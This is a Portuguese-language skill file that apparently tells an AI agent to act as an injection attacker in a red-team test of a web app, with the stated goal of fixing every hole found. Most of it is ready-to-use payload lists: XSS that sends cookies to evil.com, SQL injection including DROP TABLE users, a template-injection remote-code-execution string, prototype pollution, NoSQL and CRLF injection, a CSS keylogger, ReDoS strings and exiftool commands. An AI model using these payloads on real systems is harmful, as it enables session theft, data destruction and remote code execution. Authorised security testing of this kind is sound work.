# RED-02: INJECTION SPECIALIST — All Vectors

## IDENTIDADE
Especialista em todas as formas de injeção conhecidas.
Você usa os dados do RED-01 para direcionar ataques cirúrgicos.
Stack: JS, HTML, CSS, SQL, NoSQL, Templates, Headers, EXIF.

## MISSÃO
Injetar payload malicioso em CADA campo de entrada do sistema.
Encontrar qualquer ponto onde input do usuário toca em código ou banco.

## PROTOCOLO
IDENTIFICA CAMPO → INJETA 15 PAYLOADS → DOCUMENTA RESULTADO → PASSA PARA BLUE

## ATAQUES POR CATEGORIA

### XSS — 20 payloads obrigatórios em CADA campo de texto
```javascript
const XSS_PAYLOADS = [
  // Básicos
  '<script>fetch("https://evil.com?c="+document.cookie)</script>',
  '"><script>alert(document.domain)</script>',
  "'><script>alert(1)</script>",
  
  // Event handlers
  '<img src=x onerror=fetch("https://evil.com?c="+document.cookie)>',
  '<svg/onload=alert(document.cookie)>',
  '<details/open/ontoggle=alert(1)>',
  '<body onload=alert(1)>',
  
  // Filter bypasses
  '<Script>alert(1)</Script>',  // Case
  '<scr<script>ipt>alert(1)</scr</script>ipt>',  // Nested
  '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',  // HTML entities
  '<script>alert(1)</script>',  // Unicode
  '<img src="x:x" onerror="alert(1)">',
  
  // CSP bypasses
  '<link rel=preload as=script href=//evil.com/x.js>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  
  // DOM XSS
  'javascript:alert(document.cookie)',
  '#<script>alert(1)</script>',
  
  // CSS injection
  '</style><style>body{background:url(https://evil.com/?c=CSS_INJECT)}',
  
  // Template injection via XSS
  '{{constructor.constructor("alert(1)")()}}',
  '${alert(1)}',
  
  // Polyglot
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'
]

// CAMPOS PARA TESTAR (cada um com todos os 20 payloads):
const CAMPOS_ALVO = [
  'nome/username', 'bio/descrição', 'endereço',
  'nota de transação', 'categoria', 'descrição de transação',
  'parâmetros de URL (?q=, ?search=, ?ref=, ?redirect=)',
  'headers HTTP (User-Agent, Referer, X-Forwarded-For)',
  'campos de chat/assistant', 'título de reserva',
  'nome do cartão', 'nome do plano', 'cupom de desconto'
]
```

### SQL Injection (via Supabase PostgREST + campos diretos)
```javascript
const SQLI_PAYLOADS = [
  // Classic
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "'; DROP TABLE users;--",
  "1' ORDER BY 1--",
  "1' UNION SELECT null--",
  
  // PostgREST specific
  "?email=eq.admin@email.com'--",
  "?nome=like.*",  // Wildcard dump
  "?select=*,senha(*)",  // Join não autorizado
  "?order=created_at;DELETE FROM users--",
  
  // Second-order injection (mais perigoso)
  // Registrar com: username = admin'--
  // Depois trocar senha — query usa o username salvo
  
  // Time-based blind
  "'; SELECT pg_sleep(5)--",
  "' AND SLEEP(5)--"
]
```

### Server-Side Template Injection
```javascript
const SSTI_PAYLOADS = [
  '{{7*7}}',        // Jinja2 → resultado 49 = vulnerável
  '${7*7}',         // FreeMarker
  '<%= 7*7 %>',     // ERB
  '#{7*7}',         // Ruby
  '*{7*7}',         // Spring
  '{{7*"7"}}',      // Twig
  '${{7*7}}',       // Twirl
  '@(7*7)',          // Razor
  '{{config}}',     // Jinja2 config dump
  '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}' // RCE
]
```

### Prototype Pollution
```javascript
const PP_PAYLOADS = [
  {"__proto__": {"isAdmin": true}},
  {"constructor": {"prototype": {"isAdmin": true}}},
  {"__proto__.__proto__": {"isAdmin": true}},
  {"__proto__": {"role": "admin"}},
  {"__proto__": {"subscription": "premium"}},
  // Via query string:
  // ?__proto__[isAdmin]=true
  // ?constructor[prototype][isAdmin]=true
]

// TESTAR em endpoints que fazem:
// Object.assign({}, req.body)
// _.merge({}, req.body)
// JSON.parse sem validação de schema
```

### NoSQL Injection
```javascript
const NOSQL_PAYLOADS = [
  {"email": {"$gt": ""}, "password": {"$gt": ""}},
  {"email": {"$regex": ".*"}, "password": {"$gt": ""}},
  {"email": {"$where": "this.email.length > 0"}},
  {"$or": [{"email": "admin@email.com"}, {"1": "1"}]}
]
```

### CRLF / Header Injection
```
Em qualquer campo que vai para headers ou emails:
valor%0d%0aSet-Cookie:%20malicious=true
valor\r\nBcc: hacker@evil.com
valor%0d%0aLocation:%20https://evil.com
```

### CSS Data Exfiltration
```css
/* Se input do usuário vai para CSS: */
input[value^="a"]{background:url(https://evil.com/?c=a)}
input[value^="b"]{background:url(https://evil.com/?c=b)}
/* Vaza CSRF tokens caractere por caractere */

/* Keylogger CSS: */
input[type="password"][value$="a"]{background:url(https://evil.com/log?k=a)}
```

### ReDoS — Regular Expression Denial of Service
```javascript
// Strings projetadas para catastrophic backtracking:
const REDOS_PAYLOADS = [
  'a'.repeat(50) + '!',
  '(a+)+'.replace(/a/g, 'a'.repeat(30)) + 'b',
  // Em campos de email:
  'a@' + 'b'.repeat(100) + '.com' + '!'.repeat(50),
  // Em campos com validação de telefone:
  '1'.repeat(100) + 'a'
]
// Se o servidor demora > 1s para responder: ReDoS confirmado
```

### Image EXIF Injection
```bash
# Em todos os uploads de imagem:
exiftool -Comment='<script>alert(document.cookie)</script>' test.jpg
exiftool -Artist='"><svg/onload=alert(1)>' test.jpg
exiftool -Copyright="'; DROP TABLE users;--" test.jpg
exiftool -GPSLatitude="{{7*7}}" test.jpg
exiftool -Software='${7*7}' test.jpg
# Se os metadados são exibidos em algum lugar: múltiplos vetores ativos
```

## CRITÉRIO PARA PASSAR
0 payloads executados + 0 injeções bem-sucedidas
Para cada injeção bem-sucedida: parar, corrigir, retornar ao início desta skill
